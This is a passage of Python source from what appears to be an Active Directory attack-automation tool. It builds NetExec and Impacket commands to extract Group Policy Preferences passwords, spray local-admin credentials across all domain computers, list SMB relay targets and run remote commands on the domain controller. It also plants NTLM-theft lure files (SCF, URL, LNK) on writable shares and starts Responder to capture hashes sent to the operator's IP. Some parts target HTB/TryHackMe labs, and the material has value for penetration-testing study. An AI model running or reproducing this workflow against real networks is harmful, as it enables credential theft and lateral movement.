            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"-u 'ADscan' -p '' "
            f"--log domains/{target_domain}/smb/gpp_password.log -M gpp_password"
        )
    elif auth_type == "null":
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"-u '' -p '' "
            f"--log domains/{target_domain}/smb/gpp_password.log -M gpp_password"
        )

    if command is None:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Unsupported auth type for domain {marked_target_domain}: {auth_type}"
        )
        if auth_type in {"auth", "pwned"}:
            print_error(
                "No stored credentials found for this domain. Please add credentials first."
            )
        return

    auth_type_display = {
        "auth": "Authenticated",
        "guest": "Guest Session",
        "null": "Null Session",
    }.get(shell.domains_data[target_domain]["auth"], "Unknown")

    print_operation_header(
        "GPP Password Extraction",
        details={
            "Domain": target_domain,
            "PDC": shell.domains_data[target_domain]["pdc"],
            "Auth Type": auth_type_display,
            "Module": "gpp_password",
            "Output": f"domains/{target_domain}/smb/gpp_password.log",
        },
        icon="🔐",
    )

    print_info_debug(f"Command: {command}")
    shell.execute_netexec_gpp(command, "passwords", target_domain)


def run_local_cred_reuse(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
) -> None:
    """Test local admin credential reuse across enabled computers."""
    from adscan_internal import print_operation_header
    from adscan_internal.rich_output import mark_sensitive

    cred_type = "Hash" if shell.is_hash(credential) else "Password"
    print_operation_header(
        "Local Administrator Credential Reuse Test",
        details={
            "Domain": domain,
            "Username": username,
            "Credential Type": cred_type,
            "Target": "All Enabled Computers",
            "Authentication": "Local",
            "Threads": "16",
        },
        icon="🔄",
    )

    auth_str = shell.build_auth_nxc(username, credential)
    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    command = (
        f"{shell.netexec_path} smb enabled_computers_ips.txt {auth_str} "
        f"-t 20 --timeout 30 --smb-timeout 10 --local-auth --log "
        f"domains/{marked_domain}/smb/{marked_user}_cred_reuse.txt"
    )
    print_info(
        "Checking for local admin creds reuse (Please be patient, this might take a while on large domains)"
    )
    shell.execute_local_cred_reuse(command, domain, username, credential)


_LOCAL_REUSE_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
_LOCAL_REUSE_SMB_LINE_RE = re.compile(
    r"^\s*SMB\s+(?P<target>\S+)\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+\[(?P<status>[^\]]+)\]\s+(?P<rest>.*)$"
)


def parse_local_cred_reuse_targets(log_text: str) -> list[dict[str, str]]:
    """Parse NetExec local-auth output and return successful local-admin targets."""
    if not log_text:
        return []

    seen: set[tuple[str, str, str]] = set()
    targets: list[dict[str, str]] = []

    for raw_line in log_text.splitlines():
        line = strip_ansi_codes(raw_line)
        parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line)
        if not parsed:
            continue
        rest = str(parsed.group("rest") or "")
        # Keep only confirmed local admin sessions.
        if "(pwn3d" not in rest.lower():
            continue

        target = str(parsed.group("target") or "").strip()
        hostname = str(parsed.group("host") or "").strip()
        ip_match = _LOCAL_REUSE_IPV4_RE.search(target)
        ip = ip_match.group(0) if ip_match else ""
        if not ip:
            ip_match = _LOCAL_REUSE_IPV4_RE.search(rest)
            ip = ip_match.group(0) if ip_match else ""

        dedupe_key = (target.lower(), hostname.lower(), ip.lower())
        if dedupe_key in seen:
            continue
        seen.add(dedupe_key)
        targets.append(
            {
                "target": target,
                "hostname": hostname,
                "ip": ip,
            }
        )

    return targets


def run_smb_relay_targets(shell: Any, *, domain: str) -> None:
    """Enumerate SMB relay targets (hosts with unsigned SMB) using NetExec."""
    from adscan_internal.rich_output import mark_sensitive

    auth = shell.build_auth_nxc(
        shell.domains_data[shell.domain]["username"],
        shell.domains_data[shell.domain]["password"],
        shell.domain,
    )
    marked_domain = mark_sensitive(domain, "domain")
    command = (
        f"{shell.netexec_path} smb domains/{marked_domain}/enabled_computers_ips.txt "
        f"{auth} -t 20 --timeout 30 --smb-timeout 10 --log domains/{marked_domain}/smb/relay.log "
        f"--gen-relay-list domains/{marked_domain}/smb/relay_targets.txt"
    )

    username = shell.domains_data.get(shell.domain, {}).get("username", "N/A")
    print_operation_header(
        "SMB Relay Target Enumeration",
        details={
            "Domain": domain,
            "Username": username,
            "Protocol": "SMB",
            "Target": "Hosts with unsigned SMB",
            "Threads": "20",
            "Output": f"domains/{domain}/smb/relay_targets.txt",
        },
        icon="🎯",
    )
    shell.execute_generate_relay_list(command, domain)


def run_get_flags(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Obtain HTB/THM flags via NetExec SMB command execution."""
    if shell.do_sync_clock_with_pdc(domain):
        auth = shell.build_auth_nxc(username, password, domain, kerberos=True)
    else:
        auth = shell.build_auth_nxc(username, password, domain)

    pdc_hostname = shell.domains_data[domain]["pdc_hostname"]
    pdc_fqdn = pdc_hostname + "." + domain
    remote_command = (
        'cmd /c for /f \\"tokens=*\\" %i in (\'dir /s /b C:\\Users\\*user.txt '
        # HTB uses root.txt; TryHackMe uses system.txt. Do not trust lab_provider
        # (it may be absent or wrong), search both.
        'C:\\Users\\*root.txt C:\\Users\\*system.txt\') do type \\"%i\\"'
    )

    from adscan_internal.cli.flags import execute_get_flags
    from adscan_internal.rich_output import mark_sensitive

    marked_domain = mark_sensitive(domain, "domain")
    print_info(f"Obtaining flags from domain {marked_domain}")
    print_info_debug(f"Remote command: {remote_command}")
    execute_get_flags(
        shell,
        domain=domain,
        host=pdc_fqdn,
        auth=auth,
        remote_command=remote_command,
    )


def run_ask_for_smb_gpp(shell: Any, *, domain: str) -> None:
    """Prompt user to search for Group Policy Preferences files.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation, mark_sensitive

    if shell.auto:
        run_gpp_autologin(shell, target_domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        auth_type = shell.domains_data[domain]["auth"]
        session_type_display = {
            "unauth": "Null Session (Unauthenticated)",
            "auth": "Authenticated Session",
            "pwned": "Administrative Session",
            "with_users": "With Users",
        }.get(auth_type, auth_type.capitalize())

        marked_domain = mark_sensitive(domain, "domain")
        if confirm_operation(
            operation_name="GPP Enumeration",
            description="Searches for Group Policy Preferences files containing credentials",
            context={
                "Domain": marked_domain,
                "PDC": pdc,
                "Session Type": session_type_display,
                "Protocol": "SMB/445",
            },
        ):
            run_gpp_autologin(shell, target_domain=domain)


def run_ask_for_smb_gpp_autologin(shell: Any, *, domain: str) -> None:
    """Prompt user to run the NetExec `gpp_autologin` module."""
    from adscan_internal.rich_output import confirm_operation, mark_sensitive

    if shell.auto:
        run_gpp_autologin(shell, target_domain=domain)
        return

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    auth_type = shell.domains_data[domain]["auth"]
    session_type_display = {
        "unauth": "Null Session (Unauthenticated)",
        "auth": "Authenticated Session",
        "pwned": "Administrative Session",
        "with_users": "With Users",
    }.get(auth_type, auth_type.capitalize())

    marked_domain = mark_sensitive(domain, "domain")
    if confirm_operation(
        operation_name="GPP Autologin Enumeration",
        description="Searches SYSVOL for autologon credentials stored in policy preferences.",
        context={
            "Domain": marked_domain,
            "PDC": pdc,
            "Session Type": session_type_display,
            "Protocol": "SMB/445",
            "Module": "gpp_autologin",
        },
    ):
        run_gpp_autologin(shell, target_domain=domain)


def run_ask_for_smb_gpp_passwords(shell: Any, *, domain: str) -> None:
    """Prompt user to run the NetExec `gpp_password` module."""
    from adscan_internal.rich_output import confirm_operation, mark_sensitive

    if shell.auto:
        run_gpp_passwords(shell, target_domain=domain)
        return

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    auth_type = shell.domains_data[domain]["auth"]
    session_type_display = {
        "unauth": "Null Session (Unauthenticated)",
        "auth": "Authenticated Session",
        "pwned": "Administrative Session",
        "with_users": "With Users",
    }.get(auth_type, auth_type.capitalize())

    marked_domain = mark_sensitive(domain, "domain")
    if confirm_operation(
        operation_name="GPP Password Enumeration",
        description="Searches SYSVOL for cpassword entries (Group Policy Preferences).",
        context={
            "Domain": marked_domain,
            "PDC": pdc,
            "Session Type": session_type_display,
            "Protocol": "SMB/445",
            "Module": "gpp_password",
        },
    ):
        run_gpp_passwords(shell, target_domain=domain)


def run_gpp_passwords_share(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    share: str,
) -> None:
    """Enumerate GPP passwords on a specific share using Impacket Get-GPPPassword.py."""
    if username == "null":
        auth = shell.build_auth_impacket("", "", domain)
    else:
        auth = shell.build_auth_impacket(username, password, domain)

    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return

    gpp_path = os.path.join(shell.impacket_scripts_dir, "Get-GPPPassword.py")
    if not os.path.isfile(gpp_path) or not os.access(gpp_path, os.X_OK):
        print_error(
            f"Get-GPPPassword.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
        )
        return

    marked_share = mark_sensitive(share, "service")
    marked_domain = mark_sensitive(domain, "domain")
    command = f"{gpp_path} {auth} -share {marked_share}"

    print_info(
        f"Searching for Groups XML files in share {marked_share} of domain {marked_domain}"
    )

    try:
        completed_process = shell.run_command(command, timeout=300)
    except Exception as e:  # pylint: disable=broad-except
        telemetry.capture_exception(e)
        print_error("Error executing Get-GPPPassword.py.")
        print_exception(show_locals=False, exception=e)
        return

    output = completed_process.stdout or ""
    lines = output.splitlines()

    # Parse GPP credential entries
    entries: list[dict[str, str]] = []
    for idx, line in enumerate(lines):
        if "found a groups xml file" in line.lower():
            entry: dict[str, str] = {}
            # Parse subsequent lines for key: value
            for subline in lines[idx + 1 :]:
                if ":" not in subline:
                    break
                # Remove any leading log prefix "[*]" and whitespace
                cleaned = re.sub(r"^\[\*\]\s*", "", subline).strip()
                key, val = cleaned.split(":", 1)
                entry[key.strip()] = val.strip()
            if "userName" in entry and "password" in entry:
                entries.append(entry)

    if not entries:
        marked_share = mark_sensitive(share, "service")
        marked_domain = mark_sensitive(domain, "domain")
        print_info(
            f"No Groups XML files found in share {marked_share} of domain {marked_domain}"
        )
    else:
        # Display found credentials in a Rich table
        table = Table(
            title=f"[bold cyan]GPP Credentials found in {share} share[/bold cyan]",
            header_style="bold magenta",
            box=rich.box.SIMPLE,
        )
        table.add_column("Domain", style="cyan")
        table.add_column("User", style="magenta")
        table.add_column("Password", style="green")

        for entry in entries:
            full_user = entry["userName"]
            # Split domain and username from userName
            parts = full_user.rsplit("\\", 1)
            if len(parts) == 2:
                dom, usr = parts
            else:
                dom = domain
                usr = full_user
            pwd = entry.get("password", "")
            marked_dom = mark_sensitive(dom, "domain")
            marked_usr = mark_sensitive(usr, "user")
            marked_pwd = mark_sensitive(pwd, "password")
            table.add_row(marked_dom, marked_usr, marked_pwd)
            # Store credential
            shell.add_credential(dom, usr, pwd)

        print_panel_with_table(table, border_style=BRAND_COLORS["info"])

    if completed_process.returncode != 0:
        error_msg = (
            completed_process.stderr.strip()
            if completed_process.stderr
            else "Details not available"
        )
        print_error(f"Error executing Get-GPPPassword.py: {error_msg}")


def run_smbclient_upload(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
) -> None:
    """Upload generated NTLM capture files to writable SMB shares using smbclient."""
    from adscan_internal.services import ExploitationService

    workspace_cwd = shell._get_workspace_cwd()
    smb_log_dir = domain_path(
        workspace_cwd, shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    smb_log_dir_rel = domain_relpath(
        shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    if not os.path.exists(smb_log_dir):
        print_error(f"Directory {smb_log_dir_rel} not found")
        return

    service = ExploitationService()
    responder_started = False

    # Iterate over each host
    for host in hosts:
        marked_host = mark_sensitive(host, "hostname")
        print_info(f"Processing host: {marked_host}")
        # Iterate over each share for the current host
        for share in shares:
            marked_share = mark_sensitive(share, "service")
            print_info(f"Uploading files to share {marked_share}")

            result = service.smb.upload_files_to_share(
                host=host,
                share=share,
                username=username,
                password=password,
                files_dir=smb_log_dir,
                scan_id=None,
            )

            if result.success:
                marked_share = mark_sensitive(share, "service")
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"Files uploaded successfully to {marked_share} on {marked_host}"
                )
                # Keep existing behaviour: start Responder on first successful upload.
                if not responder_started:
                    shell.do_responder("")
                    responder_started = True
            else:
                marked_share = mark_sensitive(share, "service")
                marked_host = mark_sensitive(host, "hostname")
                error_msg = result.error_message or "Details not available"
                print_error(
                    f"Error uploading files to {marked_share} on {marked_host}: {error_msg}"
                )


def run_ntlm_theft(
    shell: Any,
    *,
    domain: str,
    completion_event: threading.Event | None = None,
) -> None:
    """Generate NTLM theft files using the service layer.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name for NTLM theft operation.
        completion_event: Optional threading event to signal when generation completes.
    """
    from adscan_internal.services import ExploitationService

    if not shell.myip:
        print_error("MyIP must be configured before generating files")
        if completion_event:
            completion_event.set()
        return

    # Import TOOLS_INSTALL_DIR from CLI tooling helpers
    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR

    ntlm_theft_path = os.path.join(TOOLS_INSTALL_DIR, "ntlm_theft", "ntlm_theft.py")
    workspace_cwd = shell._get_workspace_cwd()
    output_log_dir = domain_path(
        workspace_cwd, shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    output_log_dir_rel = domain_relpath(
        shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )

    print_info("Generating files for NTLM capture")

    service = ExploitationService()
    result = service.smb.generate_ntlm_theft_files(
        ntlm_theft_path=ntlm_theft_path,
        capture_ip=shell.myip,
        output_dir=output_log_dir,
        scan_id=None,
    )

    if result.success:
        print_success(f"Files generated successfully in {output_log_dir_rel}")
    else:
        error_msg = result.error_message or "Details not available"
        print_error(f"Error generating files with ntlm_theft: {error_msg}")

    if completion_event:
        completion_event.set()


def run_ask_for_smb_shares_write(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
) -> None:
    """Prompt user to upload NTLM capture files to writable shares.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        shares: List of share names to upload to.
        username: Username for authentication.
        password: Password for authentication.
        hosts: List of hostnames/IPs to upload to.
    """
    import threading
    from adscan_internal.rich_output import confirm_operation

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    num_shares = len(shares) if isinstance(shares, list) else "Multiple"
    share_list = (
        ", ".join(shares[:3])
        if isinstance(shares, list) and len(shares) <= 3
        else f"{num_shares} shares"
    )

    if confirm_operation(
        operation_name="Upload NTLM Capture Files",
        description="Uploads malicious files to writable shares to capture NTLM hashes",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Username": username,
            "Target Shares": share_list,
            "Files": "NTLM theft payloads (SCF, URL, LNK)",
            "Capture IP": shell.myip if shell.myip else "N/A",
        },
        default=True,
        icon="📤",
        show_panel=True,
    ):
        # Create an event to signal when ntlm_theft finishes
        ntlm_completed = threading.Event()

        def process_uploads():
            # Wait for ntlm_theft to finish before continuing
            ntlm_completed.wait()
            run_smbclient_upload(
                shell,
                domain=domain,
                shares=shares,
                username=username,
                password=password,
                hosts=hosts,
            )

        # Start ntlm_theft with the event
        run_ntlm_theft(shell, domain=domain, completion_event=ntlm_completed)
        # Start smbclient in another thread that waits for the signal
        upload_thread = threading.Thread(target=process_uploads, daemon=True)
        upload_thread.start()


def ask_for_smb_shares_read(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
) -> None:
    """Prompt user to analyze readable SMB shares with deterministic or AI flows.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        shares: List of share names discovered as readable.
        username: Username for authentication.
        password: Password for authentication.
        hosts: List of hostnames/IPs to map/analyze.
        share_map: Optional host->share->permission mapping from share enum.
    """
    from adscan_internal.services.ai_backend_availability_service import (
        AIBackendAvailabilityService,
    )
    from adscan_internal.rich_output import confirm_operation

    if shell.domains_data[domain]["auth"] == "pwned" and shell.type == "ctf":
        return

    original_shares_count = len(shares)
    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)
    if original_shares_count != len(shares):
        print_info_debug(
            "SMB share list filtered by global mapping exclusions: "
            f"before={original_shares_count} after={len(shares)} "
            "excluded=print$,ipc$,admin$,[A-Z]$"
        )
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No readable SMB shares remain after applying global exclusions for "
            f"{marked_domain}."
        )
        return

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    num_shares = len(shares) if isinstance(shares, list) else "Multiple"
    num_hosts = len(hosts) if isinstance(hosts, list) else "Multiple"
    output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "share_tree_map.json",
    )
    marked_output_rel = mark_sensitive(output_rel, "path")
    cifs_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )
    marked_cifs_output_rel = mark_sensitive(cifs_output_rel, "path")
    rclone_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "share_tree_map.json",
    )
    marked_rclone_output_rel = mark_sensitive(rclone_output_rel, "path")

    availability = AIBackendAvailabilityService().get_availability()
    selected_method = _select_post_mapping_sensitive_data_method(
        shell=shell,
        ai_configured=availability.configured,
    )
    if selected_method is None:
        print_info("SMB sensitive-data analysis skipped by user.")
        return

    if shell.auto:
        selected_method = "deterministic"

    if selected_method == "deterministic":
        _run_post_mapping_sensitive_data_workflow(
            shell,
            domain=domain,
            aggregate_map_abs=domain_path(
                shell.domains_dir,
                domain,
                shell.smb_dir,
                "spider_plus",
                "share_tree_map.json",
            ),
            aggregate_map_rel=output_rel,
            shares=shares,
            hosts=hosts,
            triage_username=username,
            triage_password=password,
            selected_method="deterministic",
        )
        return

    if selected_method == "ai":
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (spider_plus + AI)",
            description=(
                "Builds a reusable SMB share tree map using NetExec spider_plus "
                "(metadata only, no file download), then runs AI triage."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "Output": marked_output_rel,
                "Download Files": "No (DOWNLOAD_FLAG=False)",
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_spider_plus(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="ai",
        )
        return

    if selected_method == "ai_cifs":
        mount_root = _resolve_cifs_mount_root(shell=shell, domain=domain)
        marked_mount_root = mark_sensitive(mount_root, "path")
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (CIFS + AI)",
            description=(
                "Builds SMB share tree metadata from local CIFS mounts, then runs "
                "AI triage over the consolidated mapping."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "CIFS Mount Root": marked_mount_root,
                "Output": marked_cifs_output_rel,
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_cifs(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            cifs_mount_root=mount_root,
            selected_method="ai_cifs",
        )
        return

    if selected_method == "ai_rclone":
        if not confirm_operation(
            operation_name="SMB Share Tree Mapping (rclone + AI)",
            description=(
                "Builds SMB share tree metadata with rclone lsjson over SMB, then "
                "runs AI triage over the consolidated mapping."
            ),
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Readable Shares": str(num_shares),
                "Hosts": str(num_hosts),
                "Output": marked_rclone_output_rel,
            },
            default=True,
            icon="🗺️",
            show_panel=True,
        ):
            return
        run_smb_share_tree_mapping_with_rclone(
            shell,
            domain=domain,
            shares=shares,
            username=username,
            password=password,
            hosts=hosts,
            share_map=share_map,
            selected_method="ai_rclone",
        )
        return


def _enumerate_readable_share_context_for_mapping(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> tuple[list[str], list[str], dict[str, dict[str, str]]]:
    """Enumerate readable SMB shares and hosts for mapping workflows."""
    if not shell.netexec_path:
        return [], [], {}

    auth_args = _build_spider_plus_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    enabled_computers = domain_relpath(
        shell.domains_dir,
        domain,
        "enabled_computers_ips.txt",
    )
    smb_ips = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")
    target_path = enabled_computers if os.path.exists(enabled_computers) else smb_ips
    command = (
        f"{shell.netexec_path} smb {target_path} {auth_args} "
        "--smb-timeout 30 --shares"
    )
    completed_process = shell._run_netexec(
        command,
        domain=domain,
        timeout=1200,
        pre_sync=False,
    )
    if completed_process is None:
        return [], [], {}

    output_text = str(getattr(completed_process, "stdout", "") or "")
    share_map = parse_smb_share_map(output_text)
    read_shares, _write_shares, read_hosts, _write_hosts = summarize_share_map(share_map)
    read_shares = _filter_shares_by_global_mapping_exclusions(read_shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map) or {}
    ordered_hosts = sorted(read_hosts)
    return read_shares, ordered_hosts, share_map


def _resolve_smb_map_benchmark_credential(
    *,
    shell: Any,
    domain: str,
    credential_username: str | None,
) -> tuple[str, str] | None:
    """Resolve benchmark credential from active domain state or stored credentials."""
    domain_data = shell.domains_data.get(domain, {}) or {}
    active_username = str(domain_data.get("username", "") or "").strip()
    active_password = str(domain_data.get("password", "") or "").strip()
    requested_user = str(credential_username or "").strip()
    marked_domain = mark_sensitive(domain, "domain")

    if requested_user:
        requested_casefold = requested_user.casefold()
        credentials = domain_data.get("credentials", {})
        if isinstance(credentials, dict):
            for stored_username, stored_secret in credentials.items():
                candidate_username = str(stored_username or "").strip()
                candidate_secret = str(stored_secret or "").strip()
                if not candidate_username:
                    continue
                if candidate_username.casefold() != requested_casefold:
                    continue
                if not candidate_secret:
                    break
                print_info_debug(
                    "SMB benchmark credential override selected: "
                    f"domain={marked_domain} "
                    f"user={mark_sensitive(candidate_username, 'user')}"
                )
                return candidate_username, candidate_secret

        if (
            active_username
            and active_password
            and active_username.casefold() == requested_casefold
        ):
            print_info_debug(
                "SMB benchmark credential override matched active credential: "
                f"domain={marked_domain} "
                f"user={mark_sensitive(active_username, 'user')}"
            )
            return active_username, active_password

        marked_requested = mark_sensitive(requested_user, "user")
        print_error(
            "Requested benchmark credential user "
            f"{marked_requested} was not found for domain {marked_domain}."
        )
        print_instruction(
            "Use `creds show` to list stored credentials, "
            "or run without credential_username to use the active credential."
        )
        return None

    if active_username and active_password:
        return active_username, active_password

    print_error(
        f"No active credentials found for domain {marked_domain}. "
        "Set credentials first and retry."
    )
    return None


def run_smb_map_benchmark(
    shell: Any,
    *,
    domain: str,
    credential_username: str | None = None,
) -> None:
    """Benchmark SMB mapping backends (spider_plus, rclone, and CIFS)."""
    if domain not in getattr(shell, "domains_data", {}):
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            f"Domain {marked_domain} is not configured in the current workspace."
        )
        return

    resolved_credential = _resolve_smb_map_benchmark_credential(
        shell=shell,
        domain=domain,
        credential_username=credential_username,
    )
    if resolved_credential is None:
        return
    username, password = resolved_credential

    shares, hosts, share_map = _enumerate_readable_share_context_for_mapping(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    if not shares or not hosts:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "Benchmark aborted: no readable SMB shares/hosts were discovered for "
            f"{marked_domain}."
        )
        return

    options = [
        "NetExec spider_plus mapping",
        "rclone SMB mapping",
        "CIFS local mapping",
    ]
    selected_labels: list[str] | None
    checkbox = getattr(shell, "_questionary_checkbox", None)
    if callable(checkbox):
        selected_labels = checkbox(
            "Select SMB mapping methods to benchmark:",
            options,
        )
    else:
        selected_labels = options

    if selected_labels is None:
        print_info("SMB mapping benchmark cancelled by user.")
        return

    selected_methods: list[str] = []
    if "NetExec spider_plus mapping" in selected_labels:
        selected_methods.append("spider_plus")
    if "rclone SMB mapping" in selected_labels:
        selected_methods.append("rclone")
    if "CIFS local mapping" in selected_labels:
        selected_methods.append("cifs")
    if not selected_methods:
        print_info("No SMB mapping method selected for benchmark.")
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")
    print_operation_header(
        "SMB Mapping Benchmark",
        details={
            "Domain": marked_domain,
            "Principal": marked_user,
            "Hosts": str(len(hosts)),
            "Readable Shares": str(len(shares)),
            "Selected Methods": str(len(selected_methods)),
        },
        icon="⏱️",
    )

    results: list[dict[str, Any]] = []
    for method in selected_methods:
        started = time.perf_counter()
        try:
            if method == "spider_plus":
                success = run_smb_share_tree_mapping_with_spider_plus(
                    shell,
                    domain=domain,
                    shares=shares,
                    username=username,
                    password=password,
                    hosts=hosts,
                    share_map=share_map,
                    selected_method="deterministic",
                    run_post_mapping_workflow=False,
                )
                label = "NetExec spider_plus"
            elif method == "rclone":
                success = run_smb_share_tree_mapping_with_rclone(
                    shell,
                    domain=domain,
                    shares=shares,
                    username=username,
                    password=password,
                    hosts=hosts,
                    share_map=share_map,
                    selected_method="deterministic",
                    run_post_mapping_workflow=False,
                )
                label = "rclone SMB"
            elif method == "cifs":
                success = run_smb_share_tree_mapping_with_cifs(
                    shell,
                    domain=domain,
                    shares=shares,
                    username=username,
                    password=password,
                    hosts=hosts,
                    share_map=share_map,
                    cifs_mount_root=_resolve_cifs_mount_root(shell=shell, domain=domain),
                    selected_method="deterministic",
                    run_post_mapping_workflow=False,
                )
                label = "CIFS local"
            else:
                continue
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            success = False
            label = method

        elapsed_seconds = max(0.0, time.perf_counter() - started)
        results.append(
            {
                "method": label,
                "success": bool(success),
                "duration_seconds": elapsed_seconds,
            }
        )

    if not results:
        print_warning("SMB mapping benchmark completed with no executed methods.")
        return

    table = Table(
        title="[bold cyan]SMB Mapping Benchmark Results[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Method", style="cyan")
    table.add_column("Status", style="magenta")
    table.add_column("Duration (s)", style="green", justify="right")
    for result in results:
        status = "ok" if result["success"] else "failed"
        table.add_row(
            str(result["method"]),
            status,
            f"{float(result['duration_seconds']):.3f}",
        )

    print_panel_with_table(table, border_style=BRAND_COLORS["info"])
    _persist_smb_mapping_benchmark_results(
        shell=shell,
        domain=domain,
        username=username,
        shares_count=len(shares),
        hosts_count=len(hosts),
        selected_methods=selected_methods,
        results=results,
    )


def _persist_smb_mapping_benchmark_results(
    *,
    shell: Any,
    domain: str,
    username: str,
    shares_count: int,
    hosts_count: int,
    selected_methods: list[str],
    results: list[dict[str, Any]],
) -> None:
    """Persist SMB mapping benchmark results as run + cumulative history JSON."""
    from adscan_internal.workspaces import read_json_file, write_json_file

    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
    )
    runs_dir_abs = os.path.join(benchmark_root_abs, "runs")
    os.makedirs(runs_dir_abs, exist_ok=True)

    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_basename = f"{run_id}_{_slugify_token(username)}.json"
    run_file_abs = os.path.join(runs_dir_abs, run_basename)
    run_file_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "runs",
        run_basename,
    )
    history_abs = os.path.join(benchmark_root_abs, "history.json")
    history_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "history.json",
    )

    created_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
    successful = [item for item in results if bool(item.get("success"))]
    fastest_success = (
        min(
            successful,
            key=lambda item: float(item.get("duration_seconds", 0.0)),
        )
        if successful
        else None
    )
    run_payload: dict[str, Any] = {
        "schema_version": 1,
        "run_id": run_id,
        "created_at": created_at,
        "domain": domain,
        "principal": f"{domain}\\{username}",
        "hosts_count": int(hosts_count),
        "shares_count": int(shares_count),
        "selected_methods": list(selected_methods),
        "results": list(results),
        "fastest_successful_method": (
            str(fastest_success.get("method", "")) if fastest_success else ""
        ),
        "fastest_successful_duration_seconds": (
            float(fastest_success.get("duration_seconds", 0.0))
            if fastest_success
            else None
        ),
    }
    normalized_method_results = _normalize_benchmark_method_results(results)

    history_payload: dict[str, Any] = {
        "schema_version": 1,
        "domain": domain,
        "updated_at": created_at,
        "runs": [],
    }
    if os.path.exists(history_abs):
        existing = read_json_file(history_abs)
        if isinstance(existing, dict):
            history_payload = existing
            history_payload.setdefault("schema_version", 1)
            history_payload.setdefault("domain", domain)
            history_payload.setdefault("runs", [])

    history_entry: dict[str, Any] = {
        "run_id": run_id,
        "created_at": created_at,
        "principal": f"{domain}\\{username}",
        "hosts_count": int(hosts_count),
        "shares_count": int(shares_count),
        "selected_methods": list(selected_methods),
        "results_count": len(results),
        "success_count": len(successful),
        "fastest_successful_method": (
            str(fastest_success.get("method", "")) if fastest_success else ""
        ),
        "fastest_successful_duration_seconds": (
            float(fastest_success.get("duration_seconds", 0.0))
            if fastest_success
            else None
        ),
        "run_file": run_file_rel,
        "method_results": normalized_method_results,
    }
    history_runs = history_payload.get("runs")
    if not isinstance(history_runs, list):
